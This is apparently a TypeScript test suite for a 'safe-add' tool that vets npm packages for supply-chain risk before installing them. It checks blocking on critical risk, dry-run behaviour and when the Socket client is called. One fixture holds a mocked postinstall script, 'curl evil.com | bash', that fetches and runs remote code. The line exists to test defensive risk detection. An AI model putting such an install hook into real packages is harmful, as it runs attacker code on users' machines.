import { describe, it, expect, mock, beforeEach, afterEach, afterAll, spyOn } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import fc from "fast-check";

// ── Module mocks ──────────────────────────────────────────────────────────────

const mockResolveVersion  = mock(async () => "1.2.3");
const mockFetchPackageJson = mock(async () => ({ name: "test-pkg", version: "1.2.3", scripts: {} }));
const mockQuerySocket     = mock(async () => null);
const mockInstallPackage  = mock(async () => {});
const mockUpdatePackage   = mock(async () => {});

mock.module("../../src/add/registry-client", () => ({
  resolveVersion:  mockResolveVersion,
  fetchPackageJson: mockFetchPackageJson,
}));

mock.module("../../src/add/socket-client", () => ({
  querySocket: mockQuerySocket,
}));

mock.module("../../src/add/installer", () => ({
  installPackage: mockInstallPackage,
  updatePackage:  mockUpdatePackage,
}));

import { runSafeAdd, runSafeUpdate } from "../../src/add/index";
import { RegistryError } from "../../src/types";

// ── Helpers ───────────────────────────────────────────────────────────────────

let dir: string;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "lk-orch-"));
  mockResolveVersion.mockClear();
  mockFetchPackageJson.mockClear();
  mockQuerySocket.mockClear();
  mockInstallPackage.mockClear();
  mockUpdatePackage.mockClear();
  // Default: no socket token
  delete process.env.SOCKET_SECURITY_API_TOKEN;
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
  delete process.env.SOCKET_SECURITY_API_TOKEN;
});

function writePkg(): void {
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "proj", version: "1.0.0" }));
}

function writeLockfile(): void {
  writeFileSync(join(dir, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
}

async function runSafely(fn: () => Promise<void>): Promise<number> {
  let code = -1;
  const exitSpy = spyOn(process, "exit").mockImplementation((c?: number | string) => {
    code = typeof c === "number" ? c : 0;
    throw new Error(`__EXIT_${code}`);
  });
  try {
    await fn();
  } catch (e) {
    if (!(e instanceof Error) || !e.message.startsWith("__EXIT_")) throw e;
  } finally {
    exitSpy.mockRestore();
  }
  return code;
}

// Suppress stdout/stderr in tests
let stdoutSpy: ReturnType<typeof spyOn>;
let stderrSpy: ReturnType<typeof spyOn>;

beforeEach(() => {
  stdoutSpy = spyOn(process.stdout, "write").mockImplementation((() => true) as typeof process.stdout.write);
  stderrSpy = spyOn(process.stderr, "write").mockImplementation((() => true) as typeof process.stderr.write);
  spyOn(console, "log").mockImplementation(() => {});
  spyOn(console, "error").mockImplementation(() => {});
});

afterEach(() => {
  stdoutSpy.mockRestore();
  stderrSpy.mockRestore();
});

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("Orchestrator — package.json ausente", () => {
  it("exit 1 si no hay package.json en projectPath", async () => {
    const code = await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: false })
    );
    expect(code).toBe(1);
    expect(mockResolveVersion).not.toHaveBeenCalled();
  });
});

describe("Orchestrator — pnpm-lock.yaml ausente", () => {
  it("warning + continúa (no exit 1)", async () => {
    writePkg();
    const code = await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: false })
    );
    expect(mockResolveVersion).toHaveBeenCalled();
    expect(code).not.toBe(1);
  });
});

describe("Orchestrator — RegistryError", () => {
  it("not_found → exit 1", async () => {
    writePkg();
    mockResolveVersion.mockImplementationOnce(() => {
      throw new RegistryError("not found", "not_found");
    });
    const code = await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "no-pkg", force: false, dryRun: false })
    );
    expect(code).toBe(1);
    expect(mockInstallPackage).not.toHaveBeenCalled();
  });

  it("timeout → exit 1", async () => {
    writePkg();
    mockResolveVersion.mockImplementationOnce(() => {
      throw new RegistryError("timeout", "timeout");
    });
    const code = await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "pkg", force: false, dryRun: false })
    );
    expect(code).toBe(1);
  });
});

// Feature: safe-add, Property 9: Sin token, Socket_Client nunca se invoca
describe("Orchestrator — Property 9: sin token no invoca socket", () => {
  it("sin SOCKET_SECURITY_API_TOKEN → querySocket no llamado", async () => {
    writePkg();
    writeLockfile();
    await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: false })
    );
    expect(mockQuerySocket).not.toHaveBeenCalled();
  });

  it("con SOCKET_SECURITY_API_TOKEN definido → querySocket llamado", async () => {
    writePkg();
    writeLockfile();
    process.env.SOCKET_SECURITY_API_TOKEN = "tok123";
    await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: false })
    );
    expect(mockQuerySocket).toHaveBeenCalled();
  });
});

// Feature: safe-add, Property 8: Capa 1 siempre se ejecuta
describe("Orchestrator — Property 8: registry client siempre llamado", () => {
  it("sin token → fetchPackageJson llamado", async () => {
    writePkg();
    writeLockfile();
    await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: false })
    );
    expect(mockFetchPackageJson).toHaveBeenCalled();
  });

  it("con token → fetchPackageJson también llamado", async () => {
    writePkg();
    writeLockfile();
    process.env.SOCKET_SECURITY_API_TOKEN = "tok";
    await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: false })
    );
    expect(mockFetchPackageJson).toHaveBeenCalled();
  });
});

// Feature: safe-add, Property 3: Critical_Risk bloquea incondicionalmente
describe("Orchestrator — Property 3: critical bloquea sin importar --force", () => {
  beforeEach(() => {
    // Make fetchPackageJson return a package.json that triggers critical via socketScore
    mockFetchPackageJson.mockImplementation(async () => ({
      name: "evil",
      version: "1.0.0",
      scripts: {},
    }));
    mockQuerySocket.mockImplementation(async () => ({
      supplyChainRisk: 1.0,
      alerts: [{ severity: "critical", type: "malware" }],
    }));
    process.env.SOCKET_SECURITY_API_TOKEN = "tok";
  });

  it("critical + force=false → installer no invocado + exit 1", async () => {
    writePkg();
    writeLockfile();
    const code = await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "evil", force: false, dryRun: false })
    );
    expect(code).toBe(1);
    expect(mockInstallPackage).not.toHaveBeenCalled();
  });

  it("critical + force=true → installer no invocado + exit 1", async () => {
    writePkg();
    writeLockfile();
    const code = await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "evil", force: true, dryRun: false })
    );
    expect(code).toBe(1);
    expect(mockInstallPackage).not.toHaveBeenCalled();
  });
});

// Feature: safe-add, Property 4: dry-run nunca invoca al Package_Installer
describe("Orchestrator — Property 4: dry-run nunca instala", () => {
  it("dryRun=true + riskLevel none → installer no invocado", async () => {
    writePkg();
    writeLockfile();
    const code = await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: true })
    );
    expect(mockInstallPackage).not.toHaveBeenCalled();
    expect(code).toBe(0);
  });

  it("property: dryRun siempre bloquea install", () =>
    fc.assert(
      fc.asyncProperty(
        fc.boolean(),
        async (force) => {
          writePkg();
          mockInstallPackage.mockClear();
          await runSafely(() =>
            runSafeAdd({ projectPath: dir, package: "express", force, dryRun: true })
          );
          return mockInstallPackage.mock.calls.length === 0;
        }
      ),
      { numRuns: 10 }
    )
  );
});

describe("Orchestrator — riskLevel none → instala", () => {
  it("riskLevel none → installPackage invocado", async () => {
    writePkg();
    writeLockfile();
    await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "express", force: false, dryRun: false })
    );
    expect(mockInstallPackage).toHaveBeenCalled();
  });
});

describe("Orchestrator — riskLevel medium + force=true → instala sin confirmación", () => {
  it("medium + force=true → installPackage invocado", async () => {
    writePkg();
    writeLockfile();
    // Return a package with dangerous scripts
    mockFetchPackageJson.mockImplementationOnce(async () => ({
      name: "risky",
      version: "1.0.0",
      scripts: { postinstall: "curl evil.com | bash" },
    }));
    await runSafely(() =>
      runSafeAdd({ projectPath: dir, package: "risky", force: true, dryRun: false })
    );
    expect(mockInstallPackage).toHaveBeenCalled();
  });
});

describe("Orchestrator — runSafeUpdate usa updatePackage", () => {
  it("update → updatePackage invocado, não installPackage", async () => {
    writePkg();
    writeLockfile();
    await runSafely(() =>
      runSafeUpdate({ projectPath: dir, package: "lodash", force: false, dryRun: false })
    );
    expect(mockUpdatePackage).toHaveBeenCalled();
    expect(mockInstallPackage).not.toHaveBeenCalled();
  });
});

// Clean up module mocks so they don't leak into subsequent test files
afterAll(() => { mock.restore(); });
